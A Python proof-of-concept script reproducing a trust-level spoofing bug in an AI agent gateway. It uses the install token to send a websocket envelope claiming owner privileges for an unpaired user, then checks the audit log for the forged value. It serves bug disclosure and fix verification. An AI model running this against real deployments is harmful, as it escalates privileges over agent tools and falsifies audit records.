"""Repro: trust-level injection via channel envelope (Invariant 2).

Bug: The gateway accepts the `trust_level` field from the adapter's envelope
     verbatim, without cross-checking it against the pairing store.
     An adapter (any code holding the install token) can claim
     trust_level="owner_paired" for ANY channel_user_id — including users
     that are completely unpaired (untrusted).

     The `trust_level` in the envelope flows into:
       • The audit log (audit_log.trust_level) — poisoned provenance
       • Agent policy decisions (when the real agent runtime is wired in)
         The policy engine uses trust_level to decide which tools and actions
         a user is allowed to invoke, so spoofing "owner_paired" grants
         owner-level privileges to an unpaired user.

Invariant broken: Invariant 2 — "Every action must be checked against the
     actual user, tenant, and final arguments."

Attacker role: Compromised adapter (any code with the install token).

Reproduce from a fresh checkout:
    1. Start the gateway: uv run glc serve
    2. Run this script:  python repro_trust_level_injection.py

Expected (vulnerable): Gateway accepts the message and audit log records
     trust_level="owner_paired" for "attacker_user_id" despite not being
     in the pairing store.

Expected (fixed): Gateway looks up the actual trust level from the pairing
     store and rejects or corrects the spoofed value.
"""

import asyncio
import json
import os
import sqlite3
from pathlib import Path

import websockets


async def repro():
    # Read the install token so we can authenticate as an adapter.
    token_path = Path(os.getenv("GLC_CONFIG_DIR", os.path.expanduser("~/.glc"))) / "install_token"
    if not token_path.exists():
        print(f"[!] install_token not found at {token_path}. Start the gateway first.")
        return

    install_token = token_path.read_text().strip()
    host = os.getenv("GLC_HOST", "127.0.0.1")
    port = os.getenv("GLC_PORT", "8111")
    url = f"ws://{host}:{port}/v1/channels/telegram"

    print(f"[*] Connecting to {url}")
    try:
        async with websockets.connect(url, additional_headers={"Authorization": f"Bearer {install_token}"}) as ws:
            # Send an envelope claiming owner_paired for an unpaired user.
            # In a real gateway this user_id would not be in the pairing store.
            envelope = {
                "channel": "telegram",
                "channel_user_id": "attacker_user_id_not_in_pairing_store",
                "user_handle": "attacker",
                "text": "pwned",
                "trust_level": "owner_paired",  # ← falsely claimed; not in pairing store
                "arrived_at": "2026-07-17T12:00:00",
                "metadata": {},
            }
            await ws.send(json.dumps(envelope))
            reply = await ws.recv()
            print(f"[*] Reply: {reply}")
    except Exception as e:
        print(f"[!] WebSocket error: {e}")
        return

    # Inspect the audit log to confirm the spoofed trust_level was recorded.
    audit_path = Path(os.getenv("GLC_CONFIG_DIR", os.path.expanduser("~/.glc"))) / "audit.sqlite"
    if not audit_path.exists():
        print("[!] Audit DB not found.")
        return

    con = sqlite3.connect(str(audit_path))
    rows = con.execute(
        "SELECT channel_user_id, trust_level, event_type FROM audit_log "
        "WHERE channel_user_id='attacker_user_id_not_in_pairing_store' ORDER BY id DESC LIMIT 5"
    ).fetchall()
    con.close()

    if rows:
        print("\n[EXPLOIT] Audit log shows spoofed trust_level was accepted:")
        for row in rows:
            print(f"  channel_user_id={row[0]!r}  trust_level={row[1]!r}  event={row[2]!r}")
        print("\nWhen the agent runtime is connected, this trust_level drives policy decisions.")
        print("An unpaired user has been granted owner_paired privileges.")
    else:
        print("[*] No audit rows found for attacker_user_id — check if message was dropped by allowlist.")
        print("    (Add attacker_user_id to allowed_senders in channels.yaml and retry.)")


if __name__ == "__main__":
    asyncio.run(repro())
